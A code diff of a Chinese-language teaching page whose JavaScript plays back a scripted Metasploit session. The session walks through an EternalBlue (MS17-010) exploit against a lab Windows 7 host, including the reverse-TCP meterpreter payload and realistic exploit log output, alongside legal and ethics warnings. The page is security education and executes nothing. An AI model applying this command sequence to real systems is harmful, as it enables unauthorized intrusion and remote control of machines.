-                                <div class="decoder-header"><i class="fas fa-book-open"></i> 新手白話解析面板</div>
-                                <div class="decoder-content" id="decoder-content">
-                                    <div style="text-align: center; color: #666; margin-top: 60px;">
-                                        <i class="fas fa-arrow-left fa-2x" style="margin-bottom: 10px;"></i><br>
-                                        點擊左側 <strong>Step 1</strong><br>開始你的第一次駭客模擬
-                                    </div>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                    
-                    <div style="text-align: right;">
-                        <button onclick="resetSim()" style="background: transparent; border: 1px solid #444; color: #888; padding: 5px 15px; cursor: pointer; border-radius: 4px;">
-                            <i class="fas fa-redo"></i> 重置模擬器
-                        </button>
-                    </div>
-                </section>
-
-                <section id="ethics">
-                    <h2><i class="fas fa-balance-scale"></i> 法律與道德規範</h2>
+            <div class="content-right">
+                <article id="ethics">
+                    <h2><i class="fas fa-gavel"></i> 法律與道德</h2>
                     
                     <div class="danger-box">
-                        <h3><i class="fas fa-gavel"></i> 法律警告</h3>
-                        <ul style="margin-bottom: 0;">
-                            <li><strong>刑法第 358 條</strong>：入侵電腦罪，最高 5 年徒刑。</li>
-                            <li><strong>刑法第 359 條</strong>：破壞電磁紀錄罪。</li>
-                            <li><strong>刑法第 360 條</strong>：干擾電腦系統罪。</li>
-                            <li><strong>個資法</strong>：非法存取個資最高 5 年徒刑。</li>
+                        <h3><i class="fas fa-exclamation-triangle"></i> 絕對禁止</h3>
+                        <p>未經書面授權，對任何系統進行入侵測試，違反<strong>刑法第 358 條 (無故入侵電腦罪)</strong>。</p>
+                    </div>
+
+                    <div style="margin-bottom:20px;">
+                        <h4 style="color:#b446ff; margin-bottom:10px;">合法使用範圍</h4>
+                        <ul>
+                            <li>企業授權的滲透測試 (Pen-Test)</li>
+                            <li>靶機練習 (如 HackTheBox)</li>
+                            <li>學術研究</li>
                         </ul>
                     </div>
 
-                    <div class="ethics-grid">
-                        <div class="ethics-card">
-                            <h4><i class="fas fa-check-circle"></i> 合法使用範圍</h4>
-                            <ul>
-                                <li><strong>自有系統</strong>：測試自己的電腦和網路。</li>
-                                <li><strong>虛擬環境</strong>：完全控制的虛擬實驗室。</li>
-                                <li><strong>書面授權</strong>：取得所有者的書面同意。</li>
-                                <li><strong>教育訓練</strong>：學校或認證課程的實驗。</li>
-                            </ul>
-                        </div>
-                        <div class="ethics-card">
-                            <h4><i class="fas fa-heart"></i> 道德準則</h4>
-                            <ul>
-                                <li><strong>知情同意</strong>：確保所有參與者了解並同意。</li>
-                                <li><strong>最小侵害</strong>：只進行必要的測試。</li>
-                                <li><strong>資料保護</strong>：不存取或修改使用者資料。</li>
-                                <li><strong>透明報告</strong>：向所有者報告發現的問題。</li>
-                            </ul>
-                        </div>
-                    </div>
-
-                    <div class="info-box">
-                        <h3><i class="fas fa-user-shield"></i> 負責任的安全研究 (白帽駭客守則)</h3>
-                        <ul style="margin-bottom: 15px;">
-                            <li>永遠在授權範圍內進行測試。</li>
-                            <li>發現漏洞時負責任地揭露。</li>
-                            <li>協助修補而非利用漏洞。</li>
-                            <li>將技能用於保護而非破壞。</li>
-                        </ul>
-                        <p style="border-top: 1px solid rgba(180, 70, 255, 0.3); padding-top: 15px; color: #fff; font-weight: bold; text-align: center;">
-                            核心精神：技術應該用來建設，而不是破壞！
+                    <div class="info-box" style="text-align: center;">
+                        <h4 style="margin-top: 0; color: #fff;">白帽駭客宣言</h4>
+                        <p>能力越大，責任越大。</p>
+                        <p style="color: #b446ff; font-weight: bold; margin-top: 10px;">
+                            Hack to Protect.
                         </p>
                     </div>
-                </section>
-            </article>
-
-            <aside>
-                <div class="info-box">
-                    <h3><i class="fas fa-laptop-code"></i> 實驗需求</h3>
-                    <ul>
-                        <li>Kali Linux (攻擊機)</li>
-                        <li>Windows 7 (靶機)</li>
-                        <li>VirtualBox</li>
-                        <li>Host-only 網路 (重要！)</li>
-                    </ul>
-                </div>
-                
-                <h3><i class="fas fa-book"></i> 章節導覽</h3>
-                <ul>
-                    <li><a href="#intro" style="color:#b466ff;">1. 基礎介紹</a></li>
-                    <li><a href="#install" style="color:#b466ff;">2. 安裝啟動</a></li>
-                    <li><a href="#simulation" style="color:#b466ff;">3. 室</a></li>
-                    <li><a href="#ethics" style="color:#b466ff;">4. 法律道德</a></li>
-                </ul>
-            </aside>
+                </article>
+            </div>
         </div>
+
     </div>
 
     <footer>
         <div class="container">
-            <p><i class="fas fa-copyright"></i> 2024 網路安全技術專題 | Metasploit Framework 滲透測試教學</p>
-            <p>本頁面包含模擬攻擊程式碼，僅供教育用途。</p>
+            <p>© 2025 Metasploit 滲透測試模擬 | 僅供資安教育用途</p>
+            <p>請務必遵守法律與道德規範</p>
         </div>
     </footer>
 
@@ -371,162 +410,189 @@ msfconsole</code></pre>
         const promptText = document.getElementById('prompt-text');
         const typingArea = document.getElementById('typing-area');
         const decoderContent = document.getElementById('decoder-content');
-        const statusDot = document.getElementById('status-dot');
-        const statusText = document.getElementById('status-text');
         
-        let currentPrompt = "root@kali:~#";
         let isTyping = false;
         let typingTimer = null;
+        let currentPromptStr = "root@kali:~#";
 
+        // 模擬數據 (保持不變)
         const scenarios = {
             1: {
                 cmd: "msfconsole",
                 info: `
                     <div class="explanation-card">
-                        <h4>Step 1: 啟動控制台</h4>
-                        <p>這是啟動 Metasploit 的指令。當你輸入這個指令，就像是打開了一個擁有幾千種武器的「軍火庫」。</p>
-                        <span class="analogy">這就像是鋼鐵人穿上盔甲，啟動抬頭顯示器 (HUD)，準備開始工作。</span>
+                        <h4>Step 1: 啟動框架</h4>
+                        <p style="color:#ccc;">這會載入 Metasploit 的核心資料庫與模組。</p>
+                        <p style="color:#ccc;">啟動時會顯示 ASCII Art Banner，這也是 MSF 的特色之一。</p>
+                        <div class="analogy">
+                            <strong>💡 白話文比喻：</strong>就像打開一個裝滿特務裝備的巨大手提箱，裡面有數千種開鎖工具和竊聽器，準備開始任務。
+                        </div>
                     </div>`,
                 output: [
-                    { text: "Starting the Metasploit Framework...", wait: 500 },
-                    { html: `<pre style="color:#b466ff; font-size:0.7em; margin:10px 0;">
+                    { text: "Starting the Metasploit Framework console...", wait: 500 },
+                    { text: "/usr/share/metasploit-framework/config/config.dat found.", wait: 1000 },
+                    { html: `<pre class="banner">
       .:okOOOkdc'           'cdkOOOko:.
     .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.
    :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:
   'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'
+  oOOOOOOOO.    .oOOOOoOOOOl.    ,OOOOOOOOo
+  dOOOOOOOO.      .cOOOOOc.      ,OOOOOOOOx
+  lOOOOOOOO.         ;d;         ,OOOOOOOOl
+  .OOOOOOOO.                     ,OOOOOOOO.
+   cOOOOOOO.                     ,OOOOOOOc
+    oOOOOOO.                     ,OOOOOOo
+     lOOOOO.                     ,OOOOOl
+      ;OOOO'                     ,OOOO;
+       .dOOo                     ,OOd.
+         ,Ok                     ,Ok.
+           ;                     ;
                                 
-       =[ metasploit v6.3.55-dev          ]
-+ -- --=[ 2385 exploits - 1234 auxiliary  ]
-</pre>`, wait: 1000 },
-                    { text: "msf6 >", type: "prompt", wait: 1200 }
+       =[ metasploit v6.3.55-dev                          ]
++ -- --=[ 2385 exploits - 1234 auxiliary - 422 post       ]
++ -- --=[ 1465 payloads - 47 encoders - 11 nops           ]
+</pre>`, wait: 1500 },
+                    { text: "msf6 >", type: "prompt", wait: 1800 }
                 ]
             },
             2: {
                 cmd: "search ms17-010",
                 info: `
                     <div class="explanation-card">
-                        <h4>Step 2: 尋找目標漏洞</h4>
-                        <p>我們在搜尋一個叫 <strong>MS17-010 (EternalBlue)</strong> 的漏洞。</p>
-                        <p>這是微軟 Windows 系統的一個著名缺陷，當年「想哭勒索軟體 (WannaCry)」就是用這個漏洞癱瘓了全世界。</p>
-                        <span class="analogy">這就像小偷在翻找這棟大樓的藍圖，看看哪一扇窗戶的鎖是壞掉的。</span>
+                        <h4>Step 2: 搜尋漏洞 (Recon)</h4>
+                        <p style="color:#ccc;">我們知道目標是 Win7，且可能未更新。所以搜尋 <strong>MS17-010 (EternalBlue)</strong>。</p>
+                        <div class="analogy">
+                            <strong>💡 白話文比喻：</strong>你在軍火庫裡搜尋「萬能鑰匙」。系統列出了好幾種型號，我們挑選最適合開這扇門的那一把。
+                        </div>
                     </div>`,
                 output: [
-                    { text: "\nMatching Modules\n================", color: "#51a4f7", wait: 500 },
-                    { text: "   #  Name                                      Rank     Description", wait: 600 },
-                    { text: "   -  ----                                      ----     -----------", wait: 700 },
-                    { text: "   0  exploit/windows/smb/ms17_010_eternalblue  average  MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption", color: "#27c93f", wait: 900 },
-                    { text: "\nmsf6 >", type: "prompt", wait: 1100 }
+                    { text: "\nMatching Modules\n================", color: "#b446ff", wait: 500 },
+                    { text: "   #  Name                                           Rank     Description", wait: 600 },
+                    { text: "   -  ----                                           ----     -----------", wait: 700 },
+                    { text: "   0  exploit/windows/smb/ms17_010_eternalblue       average  MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption", color: "#fff", wait: 900 },
+                    { text: "   1  exploit/windows/smb/ms17_010_psexec            normal   MS17-010 EternalRomance/EternalSynergy/EternalChampion", wait: 1000 },
+                    { text: "   2  auxiliary/admin/smb/ms17_010_command           normal   MS17-010 EternalRomance/EternalSynergy/EternalChampion", wait: 1100 },
+                    { text: "\nmsf6 >", type: "prompt", wait: 1500 }
                 ]
             },
             3: {
                 cmd: "use 0",
                 info: `
                     <div class="explanation-card">
-                        <h4>Step 3: 選擇攻擊工具</h4>
-                        <p>我們選擇了列表中的第 0 號工具。注意看，提示符號變成了紅色的 <span style="color:#ff5f56">exploit(...)</span>。</p>
-                        <span class="analogy">這就像你從工具箱裡拿出了「專門撬開這扇窗戶」的鐵撬，拿在手上準備使用。</span>
+                        <h4>Step 3: 選擇攻擊模組 (Load Exploit)</h4>
+                        <p style="color:#ccc;">選擇列表中的第 0 號模組。注意提示符變成了紅色：<br><span style="color:#ff5f56">exploit(...) ></span></p>
+                        <p style="color:#ccc;">這代表我們已經進入了這個特定漏洞的操作模式。</p>
+                        <div class="analogy">
+                            <strong>💡 白話文比喻：</strong>你把那把「萬能鑰匙」拿在手上了，現在準備開始調整鑰匙的刻度。
+                        </div>
                     </div>`,
                 output: [
-                    { text: "[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp", color: "#888", wait: 400 },
-                    { text: "msf6 exploit(windows/smb/ms17_010_eternalblue) >", type: "prompt", style: "exploit", wait: 600 }
+                    { text: "[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp", color: "#888", wait: 500 },
+                    { text: "msf6 exploit(windows/smb/ms17_010_eternalblue) >", type: "prompt", style: "exploit", wait: 800 }
                 ]
             },
             4: {
                 cmd: "set RHOSTS 192.168.56.102",
                 info: `
                     <div class="explanation-card">
-                        <h4>Step 4: 設定目標 (Target)</h4>
-                        <p><strong>RHOSTS</strong> 就是「受害者的 IP 位址」。</p>
-                        <p>我們告訴攻擊程式，目標是 192.168.56.102 這台電腦。</p>
-                        <span class="analogy">這就像在信封上寫上收件人的地址，如果寫錯了，你的「炸彈」就會寄錯人，這在網路上是非常危險的！</span>
+                        <h4>Step 4: 設定目標 (Targeting)</h4>
+                        <p style="color:#ccc;"><strong>RHOSTS (Remote Hosts)</strong> 是最重要的參數，指定受害者的 IP。</p>
+                        <div class="analogy">
+                            <strong>💡 白話文比喻：</strong>你在導彈導航系統中輸入目標的 GPS 座標。如果輸錯了，就會炸到自己或無辜的路人。
+                        </div>
                     </div>`,
                 output: [
                     { text: "RHOSTS => 192.168.56.102", wait: 300 },
-                    { text: "msf6 exploit(windows/smb/ms17_010_eternalblue) >", type: "prompt", style: "exploit", wait: 500 }
+                    { text: "msf6 exploit(windows/smb/ms17_010_eternalblue) >", type: "prompt", style: "exploit", wait: 600 }
                 ]
             },
             5: {
-                cmd: "set payload windows/x64/meterpreter/reverse_tcp",
-                info: `
-                    <div class="explanation-card">
-                        <h4>Step 5: 設定 Payload (間諜)</h4>
-                        <p><strong>Payload</strong> 是我們想塞進對方電腦裡的惡意程式。</p>
-                        <p>這裡選用 <strong>Reverse TCP</strong>，意思是「反向連線」。</p>
-                        <span class="analogy">這就像你派了一個間諜潛入大樓。你告訴間諜：「進去之後，立刻打電話給我！」這樣防火牆（警衛）就不會攔截，因為這是從內部打出來的電話。</span>
-                    </div>`,
-                output: [
-                    { text: "payload => windows/x64/meterpreter/reverse_tcp", wait: 300 },
-                    { text: "msf6 exploit(windows/smb/ms17_010_eternalblue) >", type: "prompt", style: "exploit", wait: 500 }
-                ]
-            },
-            6: {
                 cmd: "exploit",
                 info: `
-                    <div class="explanation-card" style="border-color: #ff5f56;">
-                        <h4>Step 6: 發動攻擊！</h4>
-                        <p>這一步最關鍵，我們發射了攻擊封包。你現在可以看到完整的攻擊過程日誌，包含漏洞檢測、堆疊調整（Heap Grooming）和 Payload 發送。</p>
-                        <span class="analogy">窗戶被撬開了 -> 間諜跳進去了 -> 間諜打電話回來了 -> 接通！我們控制了那台電腦。</span>
+                    <div class="explanation-card" style="border-color:#b446ff; box-shadow:0 0 10px rgba(180,70,255,0.2);">
+                        <h4>Step 5: 執行攻擊 (Exploitation)</h4>
+                        <p style="color:#ccc;">最關鍵的時刻！觀察以下步驟：</p>
+                        <ol style="color:#ccc; font-size:0.9rem;">
+                            <li>檢查目標是否脆弱 (Vulnerable)</li>
+                            <li>發送 Payload (Sending stage)</li>
+                            <li>建立連線 (Session opened)</li>
+                        </ol>
+                        <div class="analogy">
+                            <strong>💡 白話文比喻：</strong>鑰匙插進去了，轉動... 喀嚓！門開了！你派出的隱形間諜 (Meterpreter) 已經潛入屋內，並打電話回報：「老闆，我進來了。」
+                        </div>
                     </div>`,
                 output: [
                     { text: "[*] Started reverse TCP handler on 192.168.56.1:4444", wait: 500 },
                     { text: "[*] 192.168.56.102:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check", wait: 1200 },
-                    { text: "[+] 192.168.56.102:445 - Host is likely VULNERABLE to MS17-010!", color: "#27c93f", wait: 2000 },
+                    { text: "[+] 192.168.56.102:445 - Host is likely VULNERABLE to MS17-010!", color: "#00ff00", wait: 2000 },
                     { text: "[*] 192.168.56.102:445 - Connecting to target for exploitation.", wait: 2800 },
                     { text: "[*] 192.168.56.102:445 - Sending all but last fragment of exploit packet", wait: 3500 },
-                    { text: "[*] 192.168.56.102:445 - Starting non-paged pool grooming", wait: 4200 },
-                    { text: "[*] 192.168.56.102:445 - Sending SMBv2 buffers", wait: 5000 },
-                    { text: "[+] 192.168.56.102:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!", color: "#27c93f", wait: 6000 },
-                    { text: "[*] 192.168.56.102:445 - Sending egg to corrupt SecurityDescriptor", wait: 6800 },
-                    { text: "[*] 192.168.56.102:445 - Triggering free of corrupted buffer", wait: 7500 },
-                    { text: "[*] Sending stage (200262 bytes) to 192.168.56.102", color: "#51a4f7", wait: 8200 },
-                    { text: "[*] Meterpreter session 1 opened (192.168.56.1:4444 -> 192.168.56.102:49158)", color: "#27c93f", wait: 9000 },
-                    { text: "meterpreter >", type: "prompt", style: "meterpreter", wait: 9500 }
+                    { text: "[*] 192.168.56.102:445 - Sending SMBv2 buffers", wait: 4200 },
+                    { text: "[+] 192.168.56.102:445 - ETERNALBLUE overwrite completed successfully!", color: "#00ff00", wait: 5000 },
+                    { text: "[*] Sending stage (200262 bytes) to 192.168.56.102", color: "#b446ff", wait: 6000 },
+                    { text: "[*] Meterpreter session 1 opened (192.168.56.1:4444 -> 192.168.56.102:49158)", color: "#b446ff", wait: 7000 },
+                    { text: "meterpreter >", type: "prompt", style: "meterpreter", wait: 7500 }
                 ]
             },
-            7: {
+            6: {
                 cmd: "sysinfo",
                 info: `
-                    <div class="explanation-card" style="border-color: #27c93f;">
-                        <h4>Step 7: 任務報告</h4>
-                        <p>現在我們已經在對方電腦裡了（<strong>Meterpreter</strong> 模式）。</p>
-                        <p>輸入 <code>sysinfo</code> 查看對方是什麼系統。</p>
-                        <span class="analogy">這就像間諜已經坐在對方的辦公室裡，翻看桌上的文件，並回報：「報告老闆，這是一台 Windows 7 電腦。」</span>
+                    <div class="explanation-card" style="border-color:#00ff00;">
+                        <h4>Step 6: 後滲透 (Post-Exploitation)</h4>
+                        <p style="color:#ccc;">現在你已經完全控制了目標。<code>meterpreter</code> 是一個強大的後門工具。</p>
+                        <p style="color:#ccc;">輸入 <code>sysinfo</code> 查看戰利品資訊。</p>
+                        <div class="analogy">
+                            <strong>💡 白話文比喻：</strong>間諜正在回報屋內的狀況：「這裡是一台 Windows 7 電腦，使用者是 Administrator。」任務完成。
+                        </div>
                     </div>`,
                 output: [
-                    { text: "Computer        : WIN7-TARGET-PC", wait: 400 },
+                    { text: "Computer        : WIN7-PC", wait: 300 },
                     { text: "OS              : Windows 7 (6.1 Build 7601, Service Pack 1).", wait: 500 },
-                    { text: "Architecture    : x64", wait: 600 },
-                    { text: "Meterpreter     : x64/windows", wait: 700 },
-                    { text: "\nmeterpreter >", type: "prompt", style: "meterpreter", wait: 900 }
+                    { text: "Architecture    : x64", wait: 700 },
+                    { text: "System Language : zh_TW", wait: 900 },
+                    { text: "Domain          : WORKGROUP", wait: 1100 },
+                    { text: "Logged On Users : 2", wait: 1300 },
+                    { text: "Meterpreter     : x64/windows", wait: 1500 },
+                    { text: "\nmeterpreter >", type: "prompt", style: "meterpreter", wait: 1800 }
                 ]
             }
         };
 
+        // 執行步驟
         function runStep(id) {
             if (isTyping) return;
-            setBusy(true);
+            isTyping = true;
+            
             const data = scenarios[id];
             document.querySelectorAll('.sim-btn').forEach(b => b.classList.remove('active'));
             document.getElementById('btn-' + id).classList.add('active');
 
             typeCommand(data.cmd, () => {
-                addHistoryLog(currentPrompt, data.cmd);
+                addHistoryLog(currentPromptStr, data.cmd);
                 decoderContent.innerHTML = data.info;
+                
                 let maxWait = 0;
                 if(data.output) {
                     data.output.forEach(line => {
                         setTimeout(() => {
-                            if(line.type === 'prompt') updatePrompt(line.text, line.style);
-                            else if(line.html) printHtml(line.html);
-                            else printText(line.text, line.color);
+                            if(line.type === 'prompt') {
+                                updatePrompt(line.text, line.style);
+                            } else if (line.html) {
+                                printHtml(line.html);
+                            } else {
+                                printText(line.text, line.color);
+                            }
                         }, line.wait);
                         if(line.wait > maxWait) maxWait = line.wait;
                     });
                 }
-                setTimeout(() => setBusy(false), maxWait + 200);
+                setTimeout(() => {
+                    isTyping = false;
+                }, maxWait + 200);
             });
         }
 
+        // 打字動畫
         function typeCommand(text, callback) {
             typingArea.textContent = "";
             let i = 0;
@@ -536,32 +602,35 @@ msfconsole</code></pre>
                 if (i >= text.length) {
                     clearInterval(typingTimer);
                     setTimeout(() => {
-                        typingArea.textContent = "";
+                        typingArea.textContent = ""; // 清空輸入區 (關鍵!)
                         callback();
                     }, 300);
                 }
-            }, 40);
+            }, 30);
         }
 
+        // 添加歷史紀錄
         function addHistoryLog(p, c) {
             const div = document.createElement('div');
-            let pClass = "prompt";
-            if(p.includes("exploit")) pClass += " exploit";
-            let pColor = p.includes("meterpreter") ? "color:#27c93f" : "";
-            div.innerHTML = `<span class="${pClass}" style="${pColor}">${p}</span> ${c}`;
+            let pStyle = "color:#fff; text-decoration:underline;";
+            if(p.includes("exploit")) pStyle = "color:#ff5f56; text-decoration:underline;";
+            if(p.includes("meterpreter")) pStyle = "color:#b446ff; text-decoration:underline;";
+
+            div.innerHTML = `<span style="${pStyle} font-weight:bold; margin-right:10px;">${p}</span> ${c}`;
             termBody.insertBefore(div, promptLine);
             scrollToBottom();
         }
 
+        // 輸出文字
         function printText(text, color) {
             const div = document.createElement('div');
             div.textContent = text;
-            div.style.whiteSpace = "pre-wrap";
             if(color) div.style.color = color;
             termBody.insertBefore(div, promptLine);
             scrollToBottom();
         }
 
+        // 輸出 HTML
         function printHtml(html) {
             const div = document.createElement('div');
             div.innerHTML = html;
@@ -569,13 +638,15 @@ msfconsole</code></pre>
             scrollToBottom();
         }
 
+        // 更新提示符
         function updatePrompt(text, style) {
-            currentPrompt = text;
+            currentPromptStr = text;
             promptText.textContent = text;
-            promptText.className = "prompt";
             promptText.style.color = "";
-            if(style === 'exploit') promptText.classList.add('exploit');
-            else if(style === 'meterpreter') promptText.style.color = "#27c93f";
+            
+            if(style === 'exploit') promptText.style.color = "#ff5f56";
+            else if(style === 'meterpreter') promptText.style.color = "#b446ff";
+            
             scrollToBottom();
         }
 
@@ -583,26 +654,41 @@ msfconsole</code></pre>
             termBody.scrollTop = termBody.scrollHeight;
         }
 
-        function setBusy(busy) {
-            isTyping = busy;
-            if(busy) {
-                statusDot.className = "status-dot status-busy";
-                statusText.textContent = "執行中...";
-                statusText.style.color = "#ffbd2e";
-                setTimeout(() => { if(isTyping) setBusy(false); }, 12000); // 延長到12秒以適應長輸出
-            } else {
-                statusDot.className = "status-dot status-idle";
-                statusText.textContent = "就緒";
-                statusText.style.color = "#aaa";
-            }
-        }
-
+        // [重要修正] 重置功能
         function resetSim() {
             if(isTyping) return;
-            const logs = termBody.querySelectorAll('div:not(#prompt-line)');
-            for(let i=2; i<logs.length; i++) logs[i].remove();
-            updatePrompt("root@kali:~#");
-            decoderContent.innerHTML = '<div style="text-align: center; color: #666; margin-top: 60px;"><i class="fas fa-redo"></i> 已重置<br>請重新開始</div>';
+
+            // 1. 強制清空所有非 prompt-line 的內容 (最乾淨的做法)
+            const lines = termBody.querySelectorAll('div');
+            lines.forEach(line => {
+                if (line.id !== 'prompt-line') {
+                    line.remove();
+                }
+            });
+
+            // 2. 重新插入歡迎訊息
+            const welcome1 = document.createElement('div');
+            welcome1.textContent = "Kali GNU/Linux Rolling [Version 2024.1]";
+            termBody.insertBefore(welcome1, promptLine);
+            
+            const br = document.createElement('div');
+            br.innerHTML = "<br>";
+            termBody.insertBefore(br, promptLine);
+
+            // 3. 強制清空輸入區文字 (解決 exploit 殘留問題)
+            typingArea.textContent = "";
+
+            // 4. 重置提示符回到最原始狀態
+            updatePrompt("root@kali:~#", "");
+
+            // 5. 重置右側
+            decoderContent.innerHTML = `
+                <div style="text-align: center; color: #d1a3ff; margin-top: 100px;">
+                    <i class="fas fa-skull fa-3x" style="margin-bottom: 20px;"></i><br>
+                    準備就緒<br>點擊左側 <strong>Step 1</strong> 開始滲透
+                </div>`;
+            
+            // 6. 清除按鈕狀態
             document.querySelectorAll('.sim-btn').forEach(b => b.classList.remove('active'));
         }
     </script>
